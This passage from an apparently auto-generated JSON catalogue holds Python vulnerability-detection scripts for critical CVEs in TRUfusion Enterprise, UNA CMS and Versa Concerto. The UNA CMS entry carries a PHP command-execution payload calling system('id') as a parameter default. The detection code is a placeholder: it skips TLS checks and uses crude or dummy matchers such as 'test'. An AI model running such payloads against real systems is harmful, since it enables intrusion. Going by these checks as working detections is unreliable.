parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_27223(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-27223\nName: TRUfusion Enterprise <= 7.10.4.0 - Authentication Bypass\nSeverity: critical\nDescription: Hard-Coded Cryptographic key allowing to forge session cookies that can be used to entirely bypass authentication\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_27223:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-27223\"\n    SEVERITY = \"critical\"\n    NAME = \"TRUfusion Enterprise <= 7.10.4.0 - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains_all(body,\"\\\\\"profileName\\\\\":\",\"\\\\\"name\\\\\":\"); contains(content_type, \"application/json\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"TRUfusion Enterprise <= 7.10.4.0 - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_27223(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "trufusion",
          "auth-bypass",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_32101",
        "name": "UNA CMS <= 14.0.0-RC4 - PHP Object Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "The vulnerability is located in the /template/scripts/BxBaseMenuSetAclLevel.php script. Specifically, within the BxBaseMenuSetAclLevel::getCode() method. When calling this method, user input passed through the \"profile_id\" POST parameter is not properly sanitized before being used in a call to the unserialize() PHP function. This can be exploited by remote, unauthenticated attackers to inject arbitrary PHP objects into the application scope, allowing them to perform a variety of attacks, such as writing and executing arbitrary PHP code.",
        "severity": "critical",
        "detection": "[OR] status HTTP [200] / [OR] mot(s) 'Expires, Value, uid='",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "cmd",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: cmd",
            "default": "echo '{{randstr}}'. system('id') . '{{randstr}}';"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-32101\nName: UNA CMS <= 14.0.0-RC4 - PHP Object Injection\nSeverity: critical\nDescription: The vulnerability is located in the /template/scripts/BxBaseMenuSetAclLevel.php script. Specifically, within the BxBaseMenuSetAclLevel::getCode() method. When calling this method, user input passed through the \"profile_id\" POST parameter is not properly sanitized before being used in a call to the unserialize() PHP function. This can be exploited by remote, unauthenticated attackers to inject arbitrary PHP objects into the application scope, allowing them to perform a variety of attacks, such as writing and executing arbitrary PHP code.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_32101:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-32101\"\n    SEVERITY = \"critical\"\n    NAME = \"UNA CMS <= 14.0.0-RC4 - PHP Object Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] status HTTP [200] / [OR] mot(s) 'Expires, Value, uid='\"\n\n        # Simple word matcher simulation\n        matchers = ['Expires, Value, uid=']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"UNA CMS <= 14.0.0-RC4 - PHP Object Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_32101(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-32101\nName: UNA CMS <= 14.0.0-RC4 - PHP Object Injection\nSeverity: critical\nDescription: The vulnerability is located in the /template/scripts/BxBaseMenuSetAclLevel.php script. Specifically, within the BxBaseMenuSetAclLevel::getCode() method. When calling this method, user input passed through the \"profile_id\" POST parameter is not properly sanitized before being used in a call to the unserialize() PHP function. This can be exploited by remote, unauthenticated attackers to inject arbitrary PHP objects into the application scope, allowing them to perform a variety of attacks, such as writing and executing arbitrary PHP code.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_32101:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-32101\"\n    SEVERITY = \"critical\"\n    NAME = \"UNA CMS <= 14.0.0-RC4 - PHP Object Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] status HTTP [200] / [OR] mot(s) 'Expires, Value, uid='\"\n\n        # Simple word matcher simulation\n        matchers = ['Expires, Value, uid=']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"UNA CMS <= 14.0.0-RC4 - PHP Object Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_32101(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "una-cms",
          "php",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_34027",
        "name": "Versa Concerto API Path Based - Authentication Bypass",
        "language": "Python",
        "famille": "CVE",
        "description": "Authentication bypass in the Versa Concerto API, caused by URL decoding inconsistencies. It allowed unauthorized access to certain API endpoints by manipulating the URL path.This issue enabled attackers to bypass authentication controls and access restricted resources.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'ENTERPRISE_ADMINISTRATOR' | mot(s) 'EECP-CSRF-TOKEN'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-34027\nName: Versa Concerto API Path Based - Authentication Bypass\nSeverity: critical\nDescription: Authentication bypass in the Versa Concerto API, caused by URL decoding inconsistencies. It allowed unauthorized access to certain API endpoints by manipulating the URL path.This issue enabled attackers to bypass authentication controls and access restricted resources.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_34027:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-34027\"\n    SEVERITY = \"critical\"\n    NAME = \"Versa Concerto API Path Based - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'ENTERPRISE_ADMINISTRATOR' | mot(s) 'EECP-CSRF-TOKEN'\"\n\n        # Simple word matcher simulation\n        matchers = ['ENTERPRISE_ADMINISTRATOR', 'EECP-CSRF-TOKEN']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Versa Concerto API Path Based - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_34027(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-34027\nName: Versa Concerto API Path Based - Authentication Bypass\nSeverity: critical\nDescription: Authentication bypass in the Versa Concerto API, caused by URL decoding inconsistencies. It allowed unauthorized access to certain API endpoints by manipulating the URL path.This issue enabled attackers to bypass authentication controls and access restricted resources.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_34027:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-34027\"\n    SEVERITY = \"critical\"\n    NAME = \"Versa Concerto API Path Based - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'ENTERPRISE_ADMINISTRATOR' | mot(s) 'EECP-CSRF-TOKEN'\"\n\n        # Simple word matcher simulation\n        matchers = ['ENTERPRISE_ADMINISTRATOR', 'EECP-CSRF-TOKEN']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Versa Concerto API Path Based - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = 